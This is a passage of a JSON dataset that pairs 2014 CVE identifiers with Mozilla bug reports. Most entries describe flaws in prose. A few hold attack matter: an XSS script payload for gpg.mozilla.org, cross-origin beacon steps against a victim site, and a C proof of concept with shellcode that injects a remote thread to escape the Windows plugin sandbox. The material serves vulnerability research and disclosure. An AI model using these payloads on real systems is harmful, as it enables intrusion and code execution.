Vulnerability-Lab disclaims all warranties, either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases or trade with fraud/stolen material. Domains: www.vulnerability-lab.com - www.vuln-lab.com - www.vulnerability-lab.com/register Contact: admin@vulnerability-lab.com - support@vulnerability-lab.com - research@vulnerability-lab.com Section: video.vulnerability-lab.com - forum.vulnerability-lab.com - news.vulnerability-lab.com Social: twitter.com/#!/vuln_lab - facebook.com/VulnerabilityLab - youtube.com/user/vulnerability0lab Feeds: vulnerability-lab.com/rss/rss.php - vulnerability-lab.com/rss/rss_upcoming.php - vulnerability-lab.com/rss/rss_news.php Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission. Copyright © 2013 | Vulnerability Laboratory"
      }
    ],
    "CVE-2014-3207": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=952077",
        "title": "XSS on gpg.mozilla.org",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0 (Beta/Release) Build ID: 20131112160018 Steps to reproduce: Scanned subdomains of mozilla.org Found about gpg.mozilla.org Actual results: Scanned it and found xss on /pks/lookup/undefined1<ScRiPt>prompt(972363)</ScRiPt> Expected results: Screen PopupAlert"
      }
    ],
    "CVE-2014-3566": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1076983",
        "title": "Padding oracle attack on SSL 3.0",
        "description": "***** IMPORTANT: This information is under embargo until 2014-10-16. This MUST NOT be talked about before that time, except on a need-to-know basis. Google security have contacted us about a flaw in the CBC modes of SSL 3.0 that enables a BEAST-like attack. There is no mitigation for this attack other than to avoid negotiating CBC ciphers in SSL 3.0. Disabling SSL 3.0 might not be a good idea. Google have suggested that we instead enable the downgrade protection mechanisms defined in draft-ietf-tls-downgrade-scsv. Downgrade protection has already been implemented in with bug 1036737 and bug 1072382. All that work is being done in public. But it's only recent. The only unusual actions we would need to do is consider uplift into appropriate channels, which includes an NSS bump. There's a real question however whether this is sufficient to protect anyone other than Google. Support for this feature in server software is very difficult, since only the latest version of NSS supports this. OpenSSL does not include support for the feature as far as I can tell. In addition to the downgrade protection, we might also consider changing the set of cipher suites we offer when we downgrade to SSL 3.0 to avoid CBC modes. That basically reduces the available suites to RC4, which is pretty badly busted. The brokenness of RC4 is the reason that Google are recommending we use the downgrade SCSV mechanism instead. However, given that this new attack requires in the order of 2^7 sessions per byte, and best guesses at RC4 attacks are in the order of 2^23 sessions, that still seems like a reasonable course of action."
      }
    ],
    "CVE-2014-8636": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=987794",
        "title": "named getters can fool Xrays",
        "description": "I was talking with jorendorff, and started getting worried about DOM objects with named accessors fooling the XrayWrapper by either: (a) shadowing a native property (i.e. getElementById) or (b) shadowing an ES property. We basically had this issue for cross-origin windows in bug 860494. I'm getting a bug on file here so that I can write some tests, then we can assess whether it's actually a problem or not."
      }
    ],
    "CVE-2014-8637": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1094536",
        "title": "Apparent use of uninitialized memory when rendering BMPs on <canvas>",
        "description": "See bug 1063733 and bug 1045977 for context. I swear that I'm not drip-feeding you these :-) ...but the fuzzer just spewed out another image that appears to render differently on <canvas> across multiple runs in 33.0.2: http://lcamtuf.coredump.cx/ffbmp/"
      }
    ],
    "CVE-2014-8638": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1080987",
        "title": "navigator.sendBeacon() doesn't satisfy CORS specification",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36 Steps to reproduce: Suppose alice.csrf.jp is a victim and mallory.csrf.jp is the attacker in following scenario. 1) As a preparation, set victim's cookie by accessing following URL. http://alice.csrf.jp/cookie/set.php?domain=alice.csrf.jp&name=victim&value=secret 2) Launch attacker's page. Then, cross-origin beacon is invoked to the victim, i.e., alice.csrf.jp. http://mallory.csrf.jp/beacon/ 3) Analyze the HTTP request data sent to the victim via navigator.sendBeacon(). Actual results: Request data sent from navigator.sendBeacon() has no Origin header. Also, the request data contains victim's cookie automatically. Expected results: W3C's Beacon spec, http://www.w3.org/TR/beacon/, says Beacon request needs to be initialized as: - force Origin header flag : Set - credentials mode : omit. So, the request header should contain Origin and should NOT contain Cookie by default."
      }
    ],
    "CVE-2014-8642": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1079658",
        "title": "Critical id-pkix-ocsp-nocheck extension in an OCSP delegated responder certificate causes OCSP response verification to fail",
        "description": "[Tracking Requested - why for this release]: We currently treat all delegated OCSP responder certificates as if they had id-pkix-ocsp-nocheck, but we don't recognize the id-pkix-ocsp-nocheck extension. This causes problems if the id-pkix-ocsp-nocheck extension is present in the delegated response signer certificate. This could be a security issue because we'll throw away any Revoked/Unknown response that was signed by such a certificate. This should be easy to fix: Just add the logic for the extension to pkixcert.cpp's BackCert::RememberExtension. We actually don't need to remember its value because we don't do anything with it."
      }
    ],
    "CVE-2014-8643": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1117140",
        "title": "GMP sandbox break-out on Windows through process handle",
        "description": "The sandboxed plugin-container.exe process on Windows holds a handle to the parent process. We can observe this in windbg: 0:007:x86> !handle 18c 1 Handle 18c Type Process 0:007:x86> !handle 18c 2 Handle 18c Attributes 0 GrantedAccess 0x101441: Synch HandleCount 9 PointerCount 283079 0:007:x86> !handle 18c 8 Handle 18c Object Specific Information Process Id 5868 Parent Process 1720 Base Priority 8 While the access rights on this handle are somewhat limited (0x101441) it still allows us to duplicate handles in the parent process (PROCESS_DUP_HANDLE). Using DuplicateHandle we can issue a call that duplicate the process handle from the parent process to our current process (-1 a pseudo handles to the parent and current (sandboxed process): DuplicateHandle(0x18c, -1, -1, 0, 0, 0, 2) The call will succeed and a new handle to the parent process is created in the sandboxed child. This handle has full access to the parent which then allows for executing arbitrary code in the parent through CreateRemoteThread: 0:007:x86> !handle 36c 1 Handle 36c Type Process 0:007:x86> !handle 36c 2 Handle 36c Attributes 0 GrantedAccess 0x1fffff: Delete,ReadControl,WriteDac,WriteOwner,Synch HandleCount 9 PointerCount 282785 0:007:x86> !handle 36c 8 Handle 36c Object Specific Information Process Id 5868 Parent Process 1720 Base Priority 8 This is a quick and dirty PoC which injects a \"shellcode\" into the sandboxed process (PID on the command line and address of DuplicateHandle and the Handle are currently hardcoded): #include \"stdafx.h\" #include <stdio.h> #include <Windows.h> unsigned char code[] = \"\" \"\\xcc\\xcc\\x90\\x90\" \"\\x6A\\x02\" // PUSH 0 duplicate same access \"\\x6A\\x00\" // PUSH 0 inherit \"\\x6A\\x00\" // PUSH 0 dwDesiredAccess \"\\x6A\\x00\" // PUSH 0 lpTargetHandle \"\\x68\\xff\\xff\\xff\\xff\"//PUSH 0 // hTargetProcessHandle \"\\x68\\xff\\xff\\xff\\xff\"//PUSH 0 // hSourceHandle \"\\x68\\x8c\\x01\\x00\\x00\"//PUSH 18C // hSourceProcessHandle \"\\x68\\x00\\x87\\x5f\\x76\"//PUSH 765f8700 <--- ptr to kernel32!DuplicateHandle \"\\x58\" // POP EAX \"\\xFF\\xD0\" // CALL EAX \"\\xcc\\xcc\\x90\\x90\\xc3\"; int _tmain(int argc, _TCHAR* argv[]) { INT pid = _wtoi(argv[1]); printf(\"[-] Attaching to process %d\\n\", pid); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid); printf(\"[-] Process handle: 0x%x\\n\", hProcess); VOID *dllname = VirtualAllocEx(hProcess, NULL, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE); WriteProcessMemory(hProcess, dllname, (void*)code, sizeof(code), NULL); printf(\"[-] remote code: %x\\n\", dllname); HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) dllname, dllname, 0, NULL); printf(\"[-] Remote thread: %x\\n\", hThread); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return 0; }"
      }
    ]
  }
}